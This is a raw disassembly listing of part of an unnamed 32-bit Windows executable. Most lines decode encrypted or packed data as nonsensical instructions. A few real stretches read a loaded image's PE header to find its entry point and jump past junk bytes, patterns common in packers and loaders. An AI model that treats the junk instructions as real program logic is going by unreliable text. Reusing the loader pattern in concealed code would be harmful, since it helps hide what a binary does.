  41d7cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7ce:	jecxz  0x41d762
  41d7d0:	sbb    ch,ah
  41d7d2:	jae    0x41d796
  41d7d4:	mov    ?,WORD PTR [eax]
  41d7d6:	arpl   WORD PTR [edi-0x29],bp
  41d7d9:	xchg   BYTE PTR [eax-0x67264ad6],ch
  41d7df:	hlt    
  41d7e0:	or     BYTE PTR [ebx+0x4e],0x59
  41d7e4:	add    al,0x4d
  41d7e6:	loop   0x41d7d3
  41d7e8:	push   0xc9198c55
  41d7ed:	xchg   esp,eax
  41d7ee:	jns    0x41d7bb
  41d7f0:	ret    0x4d10
  41d7f3:	adc    BYTE PTR [ebx-0x75311f57],ch
  41d7f9:	stos   DWORD PTR es:[edi],eax
  41d7fa:	test   al,0x3a
  41d7fc:	or     ah,BYTE PTR [ebx-0x4fd8bbb]
  41d802:	ret    
  41d803:	shl    eax,0xdb
  41d806:	jbe    0x41d7e8
  41d808:	adc    eax,0x51fcfe55
  41d80d:	pop    edx
  41d80e:	xchg   ebx,eax
  41d80f:	xchg   DWORD PTR [edi-0x6b31ec9a],esi
  41d815:	sbb    BYTE PTR [esi+edx*1+0x75d8966b],ah
  41d81c:	inc    esp
  41d81d:	mov    eax,ds:0x44e821ff
  41d822:	dec    eax
  41d823:	popa   
  41d824:	push   esp
  41d825:	mov    esp,0xa70d276b
  41d82a:	(bad)  
  41d82b:	into   
  41d82c:	mov    cl,0xaf
  41d82e:	push   esp
  41d82f:	mov    BYTE PTR [edi-0x2ec44a0f],dh
  41d835:	ss call 0x8796:0x24a407fb
  41d83d:	lods   eax,DWORD PTR ds:[esi]
  41d83e:	lock lds ebp,FWORD PTR [ecx-0x57fb01f6]
  41d845:	or     eax,0x6c7d938a
  41d84a:	rcr    BYTE PTR [ebp+0x7e],cl
  41d84d:	hlt    
  41d84e:	retf   
  41d84f:	jge    0x41d83a
  41d851:	nop
  41d852:	ficomp WORD PTR [ecx]
  41d854:	jge    0x41d84d
  41d856:	sbb    al,0x53
  41d858:	repnz dec edi
  41d85a:	mov    ah,0x3d
  41d85c:	(bad)  
  41d85d:	jae    0x41d885
  41d85f:	inc    edi
  41d860:	into   
  41d861:	dec    esi
  41d862:	enter  0x8c54,0xf9
  41d866:	jo     0x41d877
  41d868:	aam    0xf8
  41d86a:	and    ebx,ecx
  41d86c:	es loopne 0x41d800
  41d86f:	repz fstp QWORD PTR [eax]
  41d872:	push   cs
  41d873:	mov    ebx,0x4dd771b6
  41d878:	push   edx
  41d879:	jo     0x41d853
  41d87b:	in     al,0x30
  41d87d:	sbb    al,bl
  41d87f:	mov    dl,0xa1
  41d881:	call   0xb45ec3e3
  41d886:	arpl   WORD PTR [edi-0xa],cx
  41d889:	mov    bh,0xdc
  41d88b:	retf   0x6bed
  41d88e:	dec    edx
  41d88f:	push   ds
  41d890:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d891:	ss pop esi
  41d893:	pusha  
  41d894:	or     bh,ch
  41d896:	rcl    DWORD PTR [eax+0x5eaba02a],0xbf
  41d89d:	cmp    edx,DWORD PTR [ecx+0x30]
  41d8a0:	gs out dx,al
  41d8a2:	aaa    
  41d8a3:	push   ebp
  41d8a4:	pusha  
  41d8a5:	cmp    DWORD PTR [edx+0x7ce745fe],esp
  41d8ab:	xor    eax,0x1f766bed
  41d8b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8b1:	jl     0x41d880
  41d8b3:	sbb    al,0x3c
  41d8b5:	xor    dl,dh
  41d8b7:	xor    DWORD PTR [ebx-0x2a9d4e9],0xffffffd0
  41d8be:	xchg   BYTE PTR [ecx-0x7415e384],ch
  41d8c4:	sub    edi,esi
  41d8c6:	push   esi
  41d8c7:	mov    esp,0x5d6b5818
  41d8cc:	fwait
  41d8cd:	lahf   
  41d8ce:	and    dh,BYTE PTR [ebx]
  41d8d0:	xchg   ebx,eax
  41d8d1:	ret    
  41d8d2:	mov    dh,BYTE PTR [ebp+0x3]
  41d8d5:	cmp    DWORD PTR [eax],0xea9f7321
  41d8db:	enter  0x4f9f,0x93
  41d8df:	out    0xdb,eax
  41d8e1:	outs   dx,DWORD PTR ds:[esi]
  41d8e2:	jmp    0x35c65d8c
  41d8e7:	hlt    
  41d8e8:	out    0x3,eax
  41d8ea:	das    
  41d8eb:	and    eax,0xda6137c1
  41d8f0:	shl    BYTE PTR [edi],cl
  41d8f2:	std    
  41d8f3:	data16 sub al,0x42
  41d8f6:	or     DWORD PTR [ecx-0x1bc6e688],0x63987999
  41d900:	ror    ah,0xe2
  41d903:	ret    0xcf4e
  41d906:	sub    DWORD PTR [ebp-0x75],ecx
  41d909:	push   esp
  41d90a:	and    al,0x18
  41d90c:	mov    edi,DWORD PTR [esp+0x1c]
  41d910:	add    eax,edx
  41d912:	adc    ecx,edi
  41d914:	mov    DWORD PTR [esp+0x18],eax
  41d918:	mov    DWORD PTR [esp+0x1c],ecx
  41d91c:	jmp    0x41d926
  41d921:	mov    ebx,0xca79a575
  41d926:	push   0x4
  41d928:	push   0x422538
  41d92d:	jmp    0x41dcfc
  41d932:	mov    cl,0x3a
  41d934:	cdq    
  41d935:	lahf   
  41d936:	bound  ebx,QWORD PTR [edx-0x24cc5e1]
  41d93c:	mov    ds:0xd90abbbc,eax
  41d941:	mov    esp,0x18164d7f
  41d946:	mov    esp,0xf8181812
  41d94b:	adc    eax,0x70f3e10d
  41d950:	cmp    eax,ebx
  41d952:	add    al,0xa1
  41d954:	aas    
  41d955:	pop    ebx
  41d956:	in     al,0xb5
  41d958:	pop    edi
  41d959:	push   ebp
  41d95a:	and    eax,0x9aa01ffe
  41d95f:	pop    ss
  41d960:	pop    edx
  41d961:	icebp  
  41d962:	or     bl,bh
  41d964:	pushf  
  41d965:	pop    edx
  41d966:	sbb    al,0xaa
  41d968:	scas   al,BYTE PTR es:[edi]
  41d969:	pop    edi
  41d96a:	or     ch,BYTE PTR [eax-0x4b352168]
  41d970:	push   ebp
  41d971:	add    eax,0x6b9bb63b
  41d976:	aam    0x1b
  41d978:	repz imul esi,DWORD PTR [ebx-0x37bdeaa5],0x62895a0d
  41d983:	aam    0x37
  41d985:	inc    edx
  41d986:	pop    edi
  41d987:	shl    BYTE PTR [ebp-0x45],cl
  41d98a:	fmul   QWORD PTR [edi-0x7f31b426]
  41d990:	mov    esi,0x32e8330f
  41d995:	out    0xb1,al
  41d997:	loope  0x41d91f
  41d999:	pop    edx
  41d99a:	mov    WORD PTR [ebx+0x2a],gs
  41d99d:	out    dx,ax
  41d99f:	pop    ds
  41d9a0:	push   eax
  41d9a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9a2:	cmp    ch,BYTE PTR [ebp+0x15]
  41d9a5:	mov    al,ds:0x18429480
  41d9aa:	xor    eax,0x2780fece
  41d9af:	jne    0x41d9fc
  41d9b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9b2:	jle    0x41da26
  41d9b4:	mov    bh,0x5e
  41d9b6:	mov    esp,0xfb96f4d5
  41d9bb:	test   al,0x9
  41d9bd:	ss dec edx
  41d9bf:	or     al,0xd0
  41d9c1:	sub    al,0xd9
  41d9c3:	sbb    eax,DWORD PTR [edi+ebp*1]
  41d9c6:	adc    eax,0xb5b7f58a
  41d9cb:	lahf   
  41d9cc:	imul   ebx,edx,0x51
  41d9cf:	sub    ah,al
  41d9d1:	xchg   ecx,eax
  41d9d2:	and    al,0xf4
  41d9d4:	mov    cl,ch
  41d9d6:	in     al,dx
  41d9d7:	and    ebx,DWORD PTR [edi+eax*4+0x37]
  41d9db:	push   esp
  41d9dc:	mov    WORD PTR [edx+0x30],cs
  41d9df:	or     ebp,DWORD PTR [ecx+esi*4]
  41d9e2:	mov    ecx,0xe4a1f18a
  41d9e7:	push   0x34
  41d9e9:	das    
  41d9ea:	inc    ebp
  41d9eb:	add    BYTE PTR [ebp+0x4fc1f006],ah
  41d9f1:	sub    ebx,ebp
  41d9f3:	mov    ah,0xe8
  41d9f5:	aam    0x3
  41d9f7:	es (bad) 
  41d9f9:	loop   0x41d9f2
  41d9fb:	xor    BYTE PTR [edx-0x10],0xce
  41d9ff:	jns    0x41da5f
  41da01:	(bad)  
  41da02:	retf   0x7293
  41da05:	pop    es
  41da06:	test   eax,0x7e4a46f3
  41da0b:	cmp    ecx,DWORD PTR [eax]
  41da0d:	and    DWORD PTR [esi-0x7d],edi
  41da10:	fstp   TBYTE PTR gs:0x1748af42
  41da17:	inc    si
  41da19:	pop    es
  41da1a:	mov    ebp,DWORD PTR [eax+eiz*2]
  41da1d:	cmp    eax,0x4a7ea5f0
  41da22:	xor    DWORD PTR [edx-0x732e9d06],edx
  41da28:	add    ebx,DWORD PTR [ebp-0x3f]
  41da2b:	mov    al,ds:0x7de6aeb1
  41da30:	sbb    DWORD PTR [eax],edi
  41da32:	aaa    
  41da33:	inc    edi
  41da34:	mov    ecx,0x2a6d6dc1
  41da39:	les    ebp,FWORD PTR [edi-0x6d]
  41da3c:	xchg   cl,bh
  41da3e:	retf   0x5ad
  41da41:	lock out dx,al
  41da43:	test   DWORD PTR [ebx],eax
  41da45:	cs int3 
  41da47:	xchg   edx,eax
  41da48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da49:	loope  0x41d9fd
  41da4b:	call   0x5e52:0xcd337da
  41da52:	sub    esp,esp
  41da54:	mov    eax,0x98d4f944
  41da59:	mov    esp,DWORD PTR fs:[ecx+ecx*8-0x17ec6fa8]
  41da61:	xor    DWORD PTR [ebp+0x4b],ebp
  41da64:	cwde   
  41da65:	xor    al,0x76
  41da67:	scas   al,BYTE PTR es:[edi]
  41da68:	dec    esp
  41da69:	popa   
  41da6a:	pop    ds
  41da6b:	ficom  WORD PTR [edi+0x1c]
  41da6e:	dec    edi
  41da6f:	into   
  41da70:	and    ch,dh
  41da72:	push   0xa
  41da74:	test   DWORD PTR [esi],ebx
  41da76:	fistp  WORD PTR [esi]
  41da78:	mov    ch,0x9d
  41da7a:	in     al,dx
  41da7b:	int3   
  41da7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da7d:	ret    
  41da7e:	pushf  
  41da7f:	into   
  41da80:	scas   eax,DWORD PTR es:[edi]
  41da81:	or     BYTE PTR [ecx],bh
  41da83:	jle    0x41da46
  41da85:	xchg   ebx,eax
  41da86:	mov    esi,0xbd532b6b
  41da8b:	scas   eax,DWORD PTR es:[edi]
  41da8c:	fisubr WORD PTR [ecx-0x2d0eb1f5]
  41da92:	and    dl,al
  41da94:	sub    al,0xa
  41da96:	sbb    DWORD PTR [edx-0x1b559937],edx
  41da9c:	add    esi,DWORD PTR [eax+0x3a8f92f7]
  41daa2:	daa    
  41daa3:	push   ebx
  41daa4:	adc    edi,DWORD PTR [edi-0x3a]
  41daa7:	pop    esp
  41daa8:	inc    edx
  41daa9:	ja     0x41da4e
  41daab:	scas   eax,DWORD PTR es:[edi]
  41daac:	mov    ah,0x2b
  41daae:	dec    ecx
  41daaf:	outs   dx,BYTE PTR ds:[esi]
  41dab0:	rcl    DWORD PTR [ecx-0x44],1
  41dab3:	aam    0xc2
  41dab5:	adc    BYTE PTR [esi+0x5a8a817a],0xf3
  41dabc:	test   esi,esp
  41dabe:	pop    ebx
  41dabf:	or     eax,0xbd2b6f08
  41dac4:	ds xchg ecx,eax
  41dac6:	cmp    DWORD PTR [ecx+0x14],esp
  41dac9:	pusha  
  41daca:	aam    0x4e
  41dacc:	and    DWORD PTR [ebx-0x44],0x47ce3a52
  41dad3:	xchg   edx,eax
  41dad4:	shl    BYTE PTR [ebx-0x5d24825d],1
  41dada:	jmp    0x9736:0xc9074865
  41dae1:	jns    0x41dab2
  41dae3:	(bad)  
  41dae4:	fisttp QWORD PTR [edi+0x7fac92bb]
  41daea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41daeb:	popf   
  41daec:	arpl   WORD PTR [edx+0x1c217b10],dx
  41daf2:	adc    eax,0xb1c96842
  41daf7:	pop    eax
  41daf8:	out    dx,eax
  41daf9:	aam    0x3e
  41dafb:	(bad)  [edx+esi*8-0x1d]
  41daff:	add    ebp,esp
  41db01:	ret    
  41db02:	dec    esp
  41db03:	jg     0x41db28
  41db05:	aas    
  41db06:	pop    ds
  41db07:	cli    
  41db08:	add    eax,0x5eb01c04
  41db0d:	fstp   TBYTE PTR [esi+0xe36f214]
  41db13:	int3   
  41db14:	pop    eax
  41db15:	jmp    0xb79:0x438e3440
  41db1c:	sar    DWORD PTR [ebp-0x21],0xa1
  41db20:	xchg   edx,eax
  41db21:	das    
  41db22:	add    al,0x4a
  41db24:	mov    ds:0x23124fa7,al
  41db29:	cmp    esp,DWORD PTR [ecx-0x2fc55905]
  41db2f:	mov    eax,ds:0xefac33bb
  41db34:	imul   edx,ebx,0xc295a6bb
  41db3a:	xchg   BYTE PTR [eax-0x168e59a2],dh
  41db40:	jmp    0x5ecf:0xf9f23eed
  41db47:	and    bl,BYTE PTR ds:0x3fd68f96
  41db4d:	push   edx
  41db4e:	enter  0x2a42,0x22
  41db52:	bound  edx,QWORD PTR [esi-0x7bf711cd]
  41db58:	xor    al,0x6f
  41db5a:	rcr    DWORD PTR [ebp-0x1674952a],cl
  41db60:	mov    ebp,0xb405228
  41db65:	mov    al,0xf4
  41db67:	push   ecx
  41db68:	jns    0x41db67
  41db6a:	retf   
  41db6b:	dec    ebx
  41db6c:	fdivr  QWORD PTR [eax]
  41db6e:	out    dx,al
  41db6f:	push   cs
  41db70:	pop    esp
  41db71:	imul   eax,DWORD PTR [esi-0x67],0x52
  41db75:	jno    0x41db6a
  41db77:	add    BYTE PTR [edi+0x5f],0x89
  41db7b:	imul   esi,DWORD PTR [edx-0x7e],0xfffffff2
  41db7f:	aad    0xd5
  41db81:	inc    ebx
  41db82:	jmp    0x8f4c:0x858e633a
  41db89:	mov    ebx,DWORD PTR [edi+ebp*8+0x292664a5]
  41db90:	jle    0x41dc0f
  41db92:	or     ah,ah
  41db94:	loope  0x41db62
  41db96:	retf   0x8bef
  41db99:	dec    esp
  41db9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db9b:	scas   eax,DWORD PTR es:[edi]
  41db9c:	push   cs
  41db9d:	ins    BYTE PTR es:[edi],dx
  41db9e:	xchg   BYTE PTR ds:[ebp+0x5f58342c],bh
  41dba5:	mov    esp,0xbcd67e8e
  41dbaa:	pushf  
  41dbab:	fneni(8087 only) 
  41dbad:	cli    
  41dbae:	inc    esp
  41dbaf:	sbb    ch,BYTE PTR [eax+0x17]
  41dbb2:	fstp   TBYTE PTR ds:0xade570b1
  41dbb8:	xchg   ecx,eax
  41dbb9:	add    eax,0xadbf7f5b
  41dbbe:	shl    DWORD PTR [esi],1
  41dbc0:	outs   dx,DWORD PTR ds:[esi]
  41dbc1:	adc    eax,0x9c8ff291
  41dbc6:	(bad)  
  41dbc7:	neg    BYTE PTR [eax+0x28]
  41dbca:	jle    0x41db55
  41dbcc:	xlat   BYTE PTR ds:[ebx]
  41dbcd:	lahf   
  41dbce:	repz (bad) 
  41dbd0:	pop    edx
  41dbd1:	std    
  41dbd2:	cmp    cl,BYTE PTR [ebp+0xa]
  41dbd5:	mov    ecx,0x52666909
  41dbda:	mov    cl,ch
  41dbdc:	jne    0x41dbb2
  41dbde:	call   0xdcd2:0xc3f65915
  41dbe5:	ss std 
  41dbe7:	shl    BYTE PTR [ebx],0x18
  41dbea:	(bad)  
  41dbeb:	int    0xb1
  41dbed:	mov    dh,0x25
  41dbef:	and    al,0x42
  41dbf1:	es sub ah,ah
  41dbf4:	add    BYTE PTR [edx-0x359d08a7],bl
  41dbfa:	ror    DWORD PTR [ebx+0x6e],1
  41dbfd:	ret    
  41dbfe:	popa   
  41dbff:	inc    esi
  41dc00:	sub    BYTE PTR [ecx+ebp*8-0x12],bl
  41dc04:	inc    ebp
  41dc05:	mov    esi,0x8d969598
  41dc0a:	sub    edi,DWORD PTR [ebp-0x7a8f6bad]
  41dc10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc11:	push   ebp
  41dc12:	rol    esi,1
  41dc14:	push   es
  41dc15:	lods   eax,DWORD PTR ds:[esi]
  41dc16:	mov    edi,0x4083eef7
  41dc1b:	hlt    
  41dc1c:	jecxz  0x41dc9c
  41dc1e:	call   0xa284:0x660a4922
  41dc25:	mov    ebp,0x3e075f1f
  41dc2a:	push   ebx
  41dc2b:	jo     0x41dca2
  41dc2d:	pop    edi
  41dc2e:	ins    DWORD PTR es:[edi],dx
  41dc2f:	sub    eax,0x927f8560
  41dc34:	scas   al,BYTE PTR es:[edi]
  41dc35:	scas   eax,DWORD PTR es:[edi]
  41dc36:	ficomp DWORD PTR [esi+0x3d]
  41dc39:	push   edx
  41dc3a:	sub    ebx,DWORD PTR [edx+eiz*4+0x11daccf2]
  41dc41:	jbe    0x41dc2b
  41dc43:	lods   eax,DWORD PTR ds:[esi]
  41dc44:	push   edi
  41dc45:	or     ch,ch
  41dc47:	push   esi
  41dc48:	data16 fscale 
  41dc4b:	push   ebp
  41dc4c:	or     BYTE PTR [esi-0x70070bb7],cl
  41dc52:	push   eax
  41dc53:	dec    edi
  41dc54:	dec    esp
  41dc55:	push   es
  41dc56:	dec    ecx
  41dc57:	inc    ecx
  41dc58:	fild   DWORD PTR [ebx+0x62]
  41dc5b:	arpl   WORD PTR cs:[eax],bp
  41dc5e:	inc    edi
  41dc5f:	loope  0x41dcac
  41dc61:	scas   al,BYTE PTR es:[edi]
  41dc62:	dec    edi
  41dc63:	ss pop esi
  41dc65:	jg     0x41dc5a
  41dc67:	ja     0x41dc1e
  41dc69:	aaa    
  41dc6a:	xor    ebp,edi
  41dc6c:	sub    DWORD PTR [ebp-0x1b1bba6c],edi
  41dc72:	dec    esi
  41dc73:	jno    0x41dc8f
  41dc75:	icebp  
  41dc76:	ja     0x41dc80
  41dc78:	mov    ds:0x18d43ee1,eax
  41dc7d:	jo     0x41dc40
  41dc7f:	adc    al,0x1d
  41dc81:	(bad)  
  41dc82:	sbb    bh,BYTE PTR [ecx-0x7c20ee71]
  41dc88:	and    eax,0xe94e49a0
  41dc8d:	jg     0x41dc62
  41dc8f:	out    dx,eax
  41dc90:	push   0x6c
  41dc92:	xor    ebp,DWORD PTR [eax+0x6]
  41dc95:	mov    edi,0x79d4281
  41dc9a:	xchg   esp,eax
  41dc9b:	push   ebx
  41dc9c:	sbb    eax,0x85b1303a
  41dca1:	or     DWORD PTR [ebx-0x45ada728],edx
  41dca7:	adc    DWORD PTR [esi],0xfffffff7
  41dcaa:	jmp    0x41dc96
  41dcac:	out    dx,al
  41dcad:	adc    DWORD PTR [esi],ebp
  41dcaf:	jns    0x41dcbf
  41dcb1:	pushf  
  41dcb2:	pop    ebp
  41dcb3:	jbe    0x41dd08
  41dcb5:	in     eax,dx
  41dcb6:	fstp   TBYTE PTR [edi+0x5daa618a]
  41dcbc:	mov    ecx,0x59814ec7
  41dcc1:	xchg   edx,eax
  41dcc2:	shr    BYTE PTR [bx+di+0x16],0xa0
  41dcc7:	clc    
  41dcc8:	cmp    BYTE PTR [edi],0x60
  41dccb:	pop    ds
  41dccc:	ret    0x9c83
  41dccf:	mov    bh,0xe3
  41dcd1:	outs   dx,BYTE PTR ds:[esi]
  41dcd2:	pusha  
  41dcd3:	out    0x7e,eax
  41dcd5:	pushf  
  41dcd6:	mov    esi,0x2e0d5e1b
  41dcdb:	hlt    
  41dcdc:	sti    
  41dcdd:	sbb    eax,0xc04e5bca
  41dce2:	or     al,0xd5
  41dce4:	and    ebx,DWORD PTR [ebx]
  41dce6:	mov    ebx,0xc1033cf0
  41dceb:	pop    esi
  41dcec:	jno    0x41dcf5
  41dcee:	retf   
  41dcef:	mov    cl,0x7a
  41dcf1:	push   0x67dbbb22
  41dcf6:	push   0x44
  41dcf8:	outs   dx,DWORD PTR ds:[esi]
  41dcf9:	das    
  41dcfa:	imul   edi,edx,0x6c24448d
  41dd00:	push   eax
  41dd01:	call   0x415231
  41dd06:	mov    eax,DWORD PTR [esp+0x64]
  41dd0a:	push   0x4
  41dd0c:	push   DWORD PTR [eax+0x1a4]
  41dd12:	lea    eax,[esp+0x74]
  41dd16:	push   eax
  41dd17:	call   0x415231
  41dd1c:	mov    eax,DWORD PTR [esp+0x64]
  41dd20:	mov    eax,DWORD PTR [eax+0x1a4]
  41dd26:	mov    eax,DWORD PTR [eax]
  41dd28:	mov    ecx,DWORD PTR [esp+0x64]
  41dd2c:	mov    eax,DWORD PTR [eax+0x3c]
  41dd2f:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41dd35:	mov    ecx,DWORD PTR [ecx]
  41dd37:	lea    eax,[ecx+eax*1+0x28]
  41dd3b:	mov    eax,DWORD PTR [eax]
  41dd3d:	add    DWORD PTR [esp+0x6c],eax
  41dd41:	mov    DWORD PTR [esp+0x30],0x127
  41dd49:	jmp    0x41e118
  41dd4e:	dec    edi
  41dd4f:	inc    eax
  41dd50:	mov    ds:0x3a6ba279,al
  41dd55:	push   ds
  41dd56:	(bad)  
  41dd57:	push   edx
  41dd59:	push   0x31
  41dd5b:	stos   BYTE PTR es:[edi],al
  41dd5c:	jne    0x41ddda
  41dd5e:	and    al,BYTE PTR [edi+0x16]
  41dd61:	sbb    BYTE PTR [edx+edx*1-0x6ce0e7e8],bh
  41dd68:	sbb    esi,0xcf04f91e
  41dd6e:	ins    DWORD PTR es:[edi],dx
  41dd6f:	jb     0x41dde1
  41dd71:	push   eax
  41dd72:	and    al,0xcb
  41dd74:	and    al,0x33
  41dd76:	xlat   BYTE PTR ds:[ebx]
  41dd77:	hlt    
  41dd78:	ins    DWORD PTR es:[edi],dx
  41dd79:	xor    al,0x11
  41dd7b:	jge    0x41dd0a
  41dd7d:	js     0x41dde5
  41dd7f:	fidiv  WORD PTR ds:0x43b875e4
  41dd85:	in     eax,0xb3
  41dd87:	hlt    
  41dd88:	sbb    eax,0x963f6ea3
  41dd8d:	push   edx
  41dd8e:	jg     0x41dd6d
  41dd90:	andps  xmm0,XMMWORD PTR [edi-0x27]
  41dd94:	mov    esp,0x3e4eba49
  41dd99:	dec    ebp
  41dd9a:	jae    0x41dd20
  41dd9c:	and    ah,dl
  41dd9e:	push   ecx
  41dd9f:	mov    WORD PTR [edi],?
  41dda1:	sbb    BYTE PTR [edx+eiz*8+0x27],dh
  41dda5:	or     ebx,DWORD PTR [ecx]
  41dda7:	jle    0x41dd3b
  41dda9:	jge    0x41dd47
  41ddab:	mov    bh,0xc8
  41ddad:	mov    esi,0x877560aa
  41ddb2:	das    
  41ddb3:	call   0xd57d:0x65835bd4
  41ddba:	shr    bh,0x48
  41ddbd:	sbb    dh,BYTE PTR [ecx+0x61]
  41ddc0:	inc    ecx
  41ddc1:	call   0x8236:0xf54e1ee8
  41ddc8:	(bad)  
  41ddc9:	test   eax,0xd25107b8
  41ddce:	jl     0x41dd7b
  41ddd0:	les    edx,FWORD PTR [ecx+edx*2+0x48814d47]
  41ddd7:	inc    esi
  41ddd8:	fisttp DWORD PTR [ebx+0x68]
  41dddb:	aaa    
  41dddc:	popa   
  41dddd:	jmp    FWORD PTR [esi]
  41dddf:	(bad)  [eax+0xf0fa8fe]
  41dde5:	sbb    bh,bl
  41dde7:	sub    al,0xe
  41dde9:	inc    esp
  41ddea:	fs inc eax
  41ddec:	cmp    eax,DWORD PTR [ebx-0x6e7a53da]
  41ddf2:	out    dx,al
  41ddf3:	call   0xf1e0:0x69c0423f
  41ddfa:	jnp    0x41de54
  41ddfc:	adc    al,0x96
  41ddfe:	mov    bh,0xb5
  41de00:	nop
  41de01:	fstp   TBYTE PTR [ebx-0x26bbcf1c]
  41de07:	push   eax
  41de08:	repnz cmp DWORD PTR [ecx-0x45],edx
  41de0c:	ret    0x1fce
  41de0f:	jl     0x41de64
  41de11:	sub    esi,edx
  41de13:	fwait
  41de14:	int3   
  41de15:	cli    
  41de16:	jmp    0x41de17
  41de18:	dec    edx
  41de19:	dec    ebp
  41de1a:	sti    
  41de1b:	mov    dh,0x66
  41de1d:	icebp  
  41de1e:	add    DWORD PTR [esi],edi
  41de20:	and    edx,DWORD PTR [edx+0x7f34b817]
  41de26:	push   0x31
  41de28:	lods   al,BYTE PTR ds:[esi]
  41de29:	add    ecx,edx
  41de2b:	xor    DWORD PTR [ebp-0x18],esp
  41de2e:	sub    esp,esp
  41de30:	add    BYTE PTR [edi+0x15],0x4b
  41de34:	inc    esp
  41de35:	and    al,0x85
  41de37:	xor    esi,esi
  41de39:	jl     0x41de6b
  41de3b:	push   ecx
  41de3c:	lock (bad) 
  41de3e:	push   ds
  41de3f:	mov    edx,0xbf6de53d
  41de44:	imul   ebx,DWORD PTR [edx],0x975e5c77
  41de4a:	pop    ecx
  41de4b:	lea    edx,ds:0x9d40782
  41de51:	mov    dl,0xa
  41de53:	push   edi
  41de54:	or     eax,0x1a6ff751
  41de59:	pop    ebx
  41de5a:	outs   dx,BYTE PTR ds:[esi]
  41de5b:	xchg   DWORD PTR [ebx-0xb],esp
  41de5e:	sub    eax,0xaf68a897
  41de63:	int3   
  41de64:	(bad)  
  41de65:	fisub  DWORD PTR [ebx-0x261eff13]
  41de6b:	gs and ebp,eax
  41de6e:	imul   esi,DWORD PTR [edx-0x6],0xffffff82
  41de72:	arpl   dx,bp
  41de74:	das    
  41de75:	cmc    
  41de76:	aaa    
  41de77:	pminsw mm2,QWORD PTR [esi-0x30]
  41de7b:	mov    eax,0x481756b4
  41de80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de81:	stos   BYTE PTR es:[edi],al
  41de82:	fs cmp eax,0x6e210bf1
  41de88:	leave  
  41de89:	out    dx,al
  41de8a:	and    BYTE PTR [esi],bl
  41de8c:	jae    0x41ded3
  41de8e:	push   esp
  41de8f:	xchg   ebp,eax
  41de90:	xor    eax,0xc7cdf326
  41de95:	adc    BYTE PTR ds:0xccaffd4d,dl
  41de9b:	(bad)
  41de9f:	add    al,0x3b
  41dea1:	or     cl,dh
  41dea3:	iret   
  41dea4:	xor    ebx,edx
  41dea6:	test   BYTE PTR [esi+0x7d],bh
  41dea9:	fdiv   DWORD PTR [eax-0x45c9fab4]
  41deaf:	fimul  DWORD PTR [edx-0x374b594e]
  41deb5:	mov    eax,ds:0x4ea47cc4
  41deba:	fld    QWORD PTR [esi]
  41debc:	nop
  41debd:	aaa    
  41debe:	sub    al,0x95
  41dec0:	test   eax,edx
  41dec2:	sbb    ch,0xd7
  41dec5:	es push 0x960e15fa
  41decb:	and    bh,ch
  41decd:	enter  0xded4,0x89
  41ded1:	addr16 mov ds:0x268c,al
  41ded5:	jmp    0x3c9c5707
  41deda:	mov    WORD PTR [edi-0x4612152f],?
  41dee0:	sahf   
  41dee1:	or     cl,cl
  41dee3:	and    edx,ecx
  41dee5:	xchg   ecx,eax
  41dee6:	rol    DWORD PTR [edi],1
  41dee8:	sbb    al,0x2f
  41deea:	pop    es
  41deeb:	push   ss
  41deec:	scas   al,BYTE PTR es:[edi]
  41deed:	push   es
  41deee:	fisub  WORD PTR [ecx-0x63dc9e1b]
  41def4:	add    BYTE PTR [edx-0x3a],al
  41def7:	sar    BYTE PTR [ebx],0xef
  41defa:	adc    BYTE PTR [edi+0x66e39e8c],0x70
  41df01:	pop    esi
  41df02:	test   BYTE PTR [edi+ebx*8],cl
  41df05:	retf   
  41df06:	outs   dx,BYTE PTR ds:[esi]
  41df07:	push   ecx
  41df08:	xor    ebp,DWORD PTR [esi-0x76]
  41df0b:	mov    eax,0x215aec6f
  41df10:	sbb    al,0x49
  41df12:	jecxz  0x41df6e
  41df14:	je     0x41df3e
  41df16:	lock jns 0x41dec6
  41df19:	cmp    DWORD PTR [ecx+eiz*8-0x64],eax
  41df1d:	mov    dl,0x4
  41df1f:	push   edx
  41df20:	or     al,0xac
  41df22:	inc    BYTE PTR [eax+edi*8]
  41df25:	icebp  
  41df26:	rcl    cl,cl
  41df28:	pop    ss
  41df29:	mov    bh,0xd
  41df2b:	sub    al,BYTE PTR [eax]
  41df2d:	in     eax,dx
  41df2e:	sbb    cl,BYTE PTR [ebp-0x51bd163a]
  41df34:	ins    DWORD PTR es:[edi],dx
  41df35:	repz dec ecx
  41df37:	add    BYTE PTR [ebp-0x74e2e8b1],bl
  41df3d:	adc    al,0xf4
  41df3f:	xor    ecx,DWORD PTR [ebp-0x30]
  41df42:	ss inc edi
  41df44:	stos   BYTE PTR es:[edi],al
  41df45:	sbb    cl,ch
  41df47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df48:	xchg   edi,ebp
  41df4a:	xor    BYTE PTR [ecx],bl
  41df4c:	test   al,0x5f
  41df4e:	jne    0x41def0
  41df50:	sbb    al,0xfa
  41df52:	dec    ebp
  41df53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df54:	ror    edi,0xa4
  41df57:	jb     0x41df3c
  41df59:	dec    ecx
  41df5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df5c:	out    0xd5,eax
  41df5e:	push   ds
  41df5f:	outs   dx,DWORD PTR ds:[esi]
  41df60:	aam    0x81
  41df62:	mov    cl,0x95
  41df64:	dec    esp
  41df65:	xchg   ecx,eax
  41df66:	fwait
  41df67:	sub    DWORD PTR [eax+edi*8],0x4b3e1038
  41df6e:	sbb    eax,0xab6d0d02
  41df73:	(bad)  
  41df74:	jbe    0x41dfda
  41df76:	push   ebx
  41df77:	or     dh,BYTE PTR [edx+eiz*1]
  41df7a:	rcl    DWORD PTR [ecx-0x70],1
